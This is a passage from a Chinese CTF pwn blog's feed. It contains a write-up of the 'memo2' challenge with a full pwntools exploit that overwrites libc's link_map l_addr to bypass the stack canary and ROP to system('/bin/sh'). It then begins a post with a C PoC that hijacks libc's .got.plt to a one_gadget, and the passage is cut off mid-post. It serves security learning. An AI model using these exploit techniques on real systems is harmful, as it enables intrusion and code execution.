class="string">&quot;Error Choice!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">sub_1614</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  qword_4130 = (<span class="type">char</span> *)mmap(<span class="number">0LL</span>, <span class="number">0x2000</span>uLL, <span class="number">3</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !qword_4130 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memset</span>(qword_4130, <span class="number">0</span>, <span class="number">0x2000</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里申请了一块mmap地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">login</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> *s1; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%29s&quot;</span>, s);</span><br><span class="line">  v0 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  s1 = (<span class="type">void</span> *)sub_1349(s, v0);</span><br><span class="line">  <span class="keyword">if</span> ( !s1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(s2);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(s1, s2, v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Password Error.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Login Success!&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(s1);</span><br><span class="line">  <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的password在IDA里解密base64（这个base64应该很好识别，看不出来的话找逆向手吧）的话，会得到错误的结果（IDA的问题），所以要通过动调来获得正确的密文，再解密为密码，是<code>CTF_is_interesting_isn0t_it?</code>。（密文查看命令：<code>tele $rebase(0x40C0)</code>)</p><p>其他地方没什么漏洞，我们直接看case5的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_1A19</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+1Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="type">char</span> src[<span class="number">24</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Where would you like to sign(after the content): &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( qword_4130[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You will overwrite some content: &quot;</span>);</span><br><span class="line">    write(<span class="number">1</span>, &amp;qword_4130[v1], <span class="number">8uLL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your name: &quot;</span>);</span><br><span class="line">  sub_17E9(src, <span class="number">80LL</span>);</span><br><span class="line">  <span class="built_in">strncpy</span>(&amp;qword_4130[v1], src, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个神奇的漏洞，程序以无符号int格式输入了一个数到int变量里，也就是那个v1。接着程序以v1为前面申请的mmap那块地址的下标，先读取8字节，然后写入16字节。很容易发现这里src是存在栈溢出漏洞的，但是程序开启了canary。也很容易发现这里有下标越界的漏洞，并且因为v1变量是int类型的，所以既可以向前也可以向后越界进行限定字节数的任意读写。</p><h3 id="0x02-尝试过但无果的思路"><a href="#0x02-尝试过但无果的思路" class="headerlink" title="0x02 尝试过但无果的思路"></a>0x02 尝试过但无果的思路</h3><ol><li>因为程序开了canary，肯定不能直接rop。既然有下标越界，第一时间想到的是劫持tls结构体。但是虽然这样就能泄露canary了，但是没法泄露libc地址。如果选择在tls结构体内泄露libc地址的话，很遗憾的是，没有办法修改canary的值，因为tls结构体中libc地址与canary值距离32个字节，所以这个思路是行不通的。</li><li>exit hook肯定打不了，因为程序直接_exit()退出了。</li><li>下标直接打到栈上，实现不了因为数字太大了。</li><li>无法劫持IO的路子，因为读写字节数不够用。</li><li>无法劫持libc的got表。原本尝试劫持stack_chk_fail的，但是只一个got表函数的话没法满足ogg条件，如果要劫持两个got表函数，需要这两个函数挨在一起，因为程序只能连续写16字节，很可惜找不到这样的gadget，所以行不通。</li></ol><h3 id="正确思路"><a href="#正确思路" class="headerlink" title="正确思路"></a>正确思路</h3><p>所以这里考虑ret2dlresolve。这个技术涉及比较多的情况和知识点，这篇文章只是针对其中一种网上比较少提及的劫持方法。这个思路来源，其实是因为那块mmap地址，我们在2.35的本地环境下（应该和靶机是不一样的）用vmmap看一下那块地址的位置：<img src="https://c-lby.top/images/ret2dl-hijack-l-addr/vmmap.png" alt="vmmap">不难发现mmap地址被加载在了libc和ld之间，那么我们通过下标就能很方便的打到ld。</p><p>之前在研究<a href="https://c-lby.top/2024/05/15/glibc-exit-hook/#dl-fini">exit hook</a>源码的时候提过一嘴，ld负责将与程序有关的文件（模块）映射到进程空间中，然后将相关记录存到<code>__rtld_global</code>中。再准确一点，他们被记录在了<code>struct link_map *_ns_loaded;</code>中。每个模块用_ns_loaded描述, 这个命名空间中所映射的模块组成一个双向链表, _ns_loaded就是这个链表的指针。我们回顾一下link_map结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* These first few members are part of the protocol with the debugger.</span></span><br><span class="line"><span class="comment">       This is the same format used in SVR4.  */</span></span><br><span class="line"><span class="comment">//模块的基地址</span></span><br><span class="line">    ElfW(Addr) l_addr;<span class="comment">/* Difference between the address in the ELF file and the addresses in memory.  */</span> <span class="comment">//模块的基地址</span></span><br><span class="line">    <span class="type">char</span> *l_name;<span class="comment">/* Absolute file name object was found in.  */</span> <span class="comment">//模块的文件名</span></span><br><span class="line">    ElfW(Dyn) *l_ld;<span class="comment">/* Dynamic section of the shared object.  */</span> <span class="comment">//指向elf的dyn节</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All following members are internal to the dynamic linker.</span></span><br><span class="line"><span class="comment">       They may change without notice.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This is an element which is only ever different from a pointer to</span></span><br><span class="line"><span class="comment">       the very same copy of this type for ld.so when it is used in more</span></span><br><span class="line"><span class="comment">       than one namespace.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of the namespace this link map belongs to.  */</span></span><br><span class="line">    Lmid_t l_ns; <span class="comment">//模块所属命名空间的idx</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line">    <span class="comment">/* Indexed pointers to dynamic section.</span></span><br><span class="line"><span class="comment">       [0,DT_NUM) are indexed by the processor-independent tags.</span></span><br><span class="line"><span class="comment">       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VERSIONTAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,</span></span><br><span class="line"><span class="comment">DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by</span></span><br><span class="line"><span class="comment">       DT_EXTRATAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,</span></span><br><span class="line"><span class="comment">DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VALTAGIDX(tagvalue) and</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,</span></span><br><span class="line"><span class="comment">DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)</span></span><br><span class="line"><span class="comment">       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */</span></span><br><span class="line">   <span class="comment">/* </span></span><br><span class="line"><span class="comment">      l_info是ELF节描述符组成的的数组</span></span><br><span class="line"><span class="comment">      ELF中一个节, 使用一个ElfW(Dyn)描述</span></span><br><span class="line"><span class="comment">      各个类型的节在l_info中的下标固定, 因此可以通过下标来区分节的类型</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Phdr)</span> *l_phdr;<span class="comment">/* Pointer to program header table in core.  */</span> <span class="comment">//elf的头表</span></span><br><span class="line">    ElfW(Addr) l_entry;<span class="comment">/* Entry point location.  */</span> <span class="comment">//elf的入口</span></span><br><span class="line">    ElfW(Half) l_phnum;<span class="comment">/* Number of program header entries.  */</span> <span class="comment">//头表的节数</span></span><br><span class="line">    ElfW(Half) l_ldnum;<span class="comment">/* Number of dynamic segment entries.  */</span> <span class="comment">//dyn中的描述符数量</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>我们的主角<code>l_addr</code>，注意到他记录了每个模块的基地址。一般来说，ld是第一个被加载的模块，libc是第二个。因此我们可以通过固定偏移直接得到libc的基地址。</p><p>获得基址之后要干什么呢？如果我们想要利用栈溢出进行rop，那么必须绕过stack_chk_fail函数。libc被载入后，基地址被记录下来，接下来调用libc中的函数，会通过这个基址加上函数在libc中的偏移计算函数的真实地址。所以如果我们劫持libc对应的l_addr减去或加上一定偏移，就能使stack_chk_fail函数被解析成其他函数。</p><p>当然这个l_addr也不能乱修改。举个例子，如果解析到了另一个函数A，但是函数A内原本还会调用函数B，这个函数B也会被解析成一个错误的函数，可能就会因为寄存器等一系列问题而导致程序卡住。所以绕过stack_chk_fail函数，一般要找不怎么受寄存器影响也不怎么会影响寄存器的函数。<code>uselib</code>就是这么完美的一个函数（unshare也行）。</p><p>这样操作下来，就算程序检测到了栈溢出，也只会执行一个没什么影响的函数，我们可以继续安心的执行ROP。</p><p>看到这里有同学可能会问了，为什么不直接让它解析为onegadget呢？很简单，因为寄存器条件并不能满足</p><h3 id="0x03-分析调试"><a href="#0x03-分析调试" class="headerlink" title="0x03 分析调试"></a>0x03 分析调试</h3><p>接下来我们看看怎么调试找到我们想要的l_addr的偏移。在pwndbg中输入<code>p/x _rtld_global._dl_rtld_map</code>就能看到关于ld的模块信息。<img src="https://c-lby.top/images/ret2dl-hijack-l-addr/ld%E7%9A%84%E6%A8%A1%E5%9D%97%E4%BF%A1%E6%81%AF.png" alt="ld的模块信息">我们沿着l_prev继续向下寻找libc。输入<code>p/x *(struct link_map *) _rtld_global._dl_rtld_map.l_prev</code>。<img src="https://c-lby.top/images/ret2dl-hijack-l-addr/libc%E7%9A%84%E6%A8%A1%E5%9D%97%E4%BF%A1%E6%81%AF.png" alt="libc的模块信息">可以看到我们就得到了libc基址。我们顺便再看一眼l_name：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p _rtld_global._dl_rtld_map.l_prev.l_name</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3 = 0x7ffff7fbb140 <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span></span><br></pre></td></tr></table></figure><p>这个l_name最好不要改动，所幸他与libc的偏移也是固定的，所以可以原封不动地写回去。</p><p>而下标的计算也很简单了，用调试中的<code>_rtld_global._dl_rtld_map.l_prev</code>减去mmap地址基地址就能得到。</p><p>到这，思路明了了，但是还要注意一个问题，程序中只有当下标达到的地方内容不为\x00才会输出8字节，但是如果直接按照上面下标的计算方法的话，第一个字节就是\x00，那就不会输出地址了，这是因为libc基址最低一个字节就是\x00，所以下标要加一。这样的话，写十六字节的时候就会写到l_ld的低一字节，这个字节是不会改变的，一直都是\xc0，payload里补上就行。</p><h3 id="0x04-EXP"><a href="#0x04-EXP" class="headerlink" title="0x04 EXP"></a>0x04 EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = process(<span class="string">&#x27;./memo2&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./memo2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># enc要通过gdb获取，ida上的是错的（tele 0x5555555580c0）</span></span><br><span class="line">pwd = <span class="string">b&#x27;CTF_is_interesting_isn0t_it?&#x27;</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;password:&#x27;</span>)</span><br><span class="line">r.sendline(pwd)</span><br><span class="line"></span><br><span class="line">printf = <span class="number">0x606F0</span></span><br><span class="line">stack_chk_fail = <span class="number">0x136550</span></span><br><span class="line">offset_mmap_libclinkmap = <span class="number">0x7fd4a6884160</span>-<span class="number">0x7fd4a6882000</span></span><br><span class="line">offset_true_fake_l_addr = libc.sym[<span class="string">&#x27;uselib&#x27;</span>]-stack_chk_fail</span><br><span class="line">offset_name_base = <span class="number">0x7ffff7fbb140</span>-<span class="number">0x7ffff7d88000</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;content): &#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(offset_mmap_libclinkmap+<span class="number">1</span>).encode())  <span class="comment"># 第一个字节是\x00，不会有回显的</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">libc_base = u64((r.recv(<span class="number">5</span>).rjust(<span class="number">6</span>, <span class="string">b&#x27;\x00&#x27;</span>)).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rdi = libc_base+<span class="number">0x2a3e5</span></span><br><span class="line">ret = libc_base+<span class="number">0x29139</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b *$rebase(0x1B0A)&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;name: &#x27;</span>)</span><br><span class="line">payload = p64(libc_base+offset_true_fake_l_addr)[<span class="number">1</span>:] + \</span><br><span class="line">    p64(libc_base+offset_name_base)+<span class="string">b&#x27;\xC0&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x05-后记"><a href="#0x05-后记" class="headerlink" title="0x05 后记"></a>0x05 后记</h3><p>这题还有其他解法，比如Qanux师傅选择劫持l_info[5]，伪造symtab，来达到将函数解析成另一个函数的效果，这种做法网上解释比较多，不多赘述。非常感谢xswlhh师傅和Qanux师傅给我机会进V&amp;N战队认识到更多强大的师傅，和这些大爹们一起打比赛。同时非常感谢xf1les爷总是耐心解答我的问题。Orz</p><p>考完期末之后应该会找时间把GeekCTF2024的题目全部复现一遍，题目质量还是非常高的，能学到不少东西。</p>]]></content>
      
      
      <categories>
          
          <category> ret2dlresolve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> WP </tag>
            
            <tag> ret2dlresolve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『hijack_libc_got』劫持libc的got表getshell</title>
      <link href="/2024/hijack-libc-got/"/>
      <url>/2024/hijack-libc-got/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>在glibc2.34或更高版本，没有了hook用来劫持，所以一般会用IO之类的路子来劫持。如果条件允许，还可以考虑劫持劫持libc的got表来getshell。libc一般是partial relro，所以got表可写。但准确来说，接下来的PoC，其实针对的是劫持.got.plt段执行one gadget而设计的。劫持libcgot的技术还可以结合context的gadget实现rop，后面再深入研究。</p><h3 id="0x01-PoC"><a href="#0x01-PoC" class="headerlink" title="0x01 PoC"></a>0x01 PoC</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdint.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;unistd.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 模拟泄露libc</span></span><br><span class="line">    <span class="type">uint64_t</span> libc_base = &amp;<span class="built_in">printf</span> - <span class="number">0x606F0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc_base = %p\n&quot;</span>, libc_base);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> gadget = libc_base + <span class="number">0xb1788</span>;</span><br><span class="line">    <span class="type">uint64_t</span> ogg = libc_base + <span class="number">0xebc88</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改j_strlen</span></span><br><span class="line">    <span class="type">uint64_t</span> j_strlen = libc_base + <span class="number">0x21A098</span>;</span><br><span class="line">    *((<span class="type">uint64_t</span> *)j_strlen) = gadget;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改j_memset</span></span><br><span class="line">    <span class="type">uint64_t</span> j_memset = libc_base + <span class="number">0x21A188</span>;</span><br><span class="line">    *((<span class="type">uint64_t</span> *)j_memset) = ogg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// getshell</span></span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshell&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://c-lby.top/images/hijack_libc_got/PoC%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C.png" alt="PoC运行结果"></p><h3 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h3><h5 id="puts函数的跟进"><a href="#puts函数的跟进" class="headerlink" title="puts函数的跟进"></a>puts函数的跟进</h5><p>PoC最后执行了一个puts函数，并且直接_exit，没法劫持exit_hook。我们去IDA翻一翻puts函数都干了些什么。<img src="https://c-lby.top/images/hijack_libc_got/puts_ida.png" alt="puts_ida"></p><p>发现它调用了j_strlen函数，我们跟进看看。<img src="https://c-lby.top/images/hijack_libc_got/j_strlen%E5%9C%A8pltsec%E6%AE%B5.png" alt="j_strlen在pltsec段"></p><p>继续跟进<img src="https://c-lby.top/images/hijack_libc_got/j_strlen%E5%9C%A8gotplt%E6%AE%B5.png" alt="j_strlen在gotplt段"></p><p>发现最后来到了.got.plt段。这是一个可读可写的段，所以我们可以通过劫持这个strlen的内容为one gadget，让程序执行到puts的时候，调用的是ogg，从而getshell。</p><h5 id="got-plt段函数的规律"><a href="#got-plt段函数的规律" class="headerlink" title=".got.plt段函数的规律"></a>.got.plt段函数的规律</h5><p>这里我们可以发现一个规律：<img src="https://c-lby.top/images/hijack_libc_got/gotplt%E6%AE%B5.png" alt="gotplt段"></p><p>不难发现这些函数大部分都指向.plt.sec段，并且命名都有<code>j_</code>开头。那么在实际做题的时候思路就很清晰了，我们可以去找我们要劫持的函数会不会调用到这样命名的函数，有的话就有机会通过劫持got表getshell。</p><h5 id="劫持strlen后无法getshell"><a href="#劫持strlen后无法getshell" class="headerlink" title="劫持strlen后无法getshell"></a>劫持strlen后无法getshell</h5><p>PoC中我并没有直接将strlen劫持为ogg，因为直接劫持是没办法getshell的。下面用一道其他题目的调试过程来展示这一点。</p><p>我们先来看ogg：<img src="https://c-lby.top/images/hijack_libc_got/ogg.png" alt="ogg"></p><p>PoC中我们选择的是0xebc88，也就是说我们要让rsi和rdx都为NULL的情况下，这个ogg才能正常getshell。但是我们运行脚本会发现程序炸了，调试观察看住的地方，发现此时rdx并不为零。<img src="https://c-lby.top/images/hijack_libc_got/ogg%E6%9D%A1%E4%BB%B6%E4%B8%8D%E6%BB%A1%E8%B6%B3.png" alt="ogg条件不满足"></p><p>那么我们就要想办法使rdx为0。当然这里调整ogg条件的方法不止一种，毕竟ogg不止这一个，还可以通过调栈的方法满足条件，这个具体视题目条件而定。</p><h5 id="调整寄存器状态满足ogg条件"><a href="#调整寄存器状态满足ogg条件" class="headerlink" title="调整寄存器状态满足ogg条件"></a>调整寄存器状态满足ogg条件</h5><p>回到这里，其实PoC的情况和上述情况差不多，也是rdx不为0导致的程序出错。解决思路是，找到形如<code>mov rdx , rsi; call xxx</code>这样的gadget，将其地址写入到strlen的got中，然后在xxx的got表中写入ogg地址。我们用<code>ropper -f libc.so.6 -search &quot;mov rdx, rsi&quot;</code>找一下gadget。<img src="https://c-lby.top/images/hijack_libc_got/gadget.png" alt="gadget"></p><p>发现有两条符合的gadget，但是上面那个gadget会导致rsi被改变为2，所以不能用。所以我们将0xb1788的gadget写到strlen的got中。在IDA中查看一下0x28670处，发现是memset的.plt.sec，因此我们只要将memset的got表改为ogg即可。顺带一提，下面那个gadget是<code>explicit_bzero</code>函数中的。</p><p><img src="https://c-lby.top/images/hijack_libc_got/gadget%E5%87%BA%E5%A4%84.png" 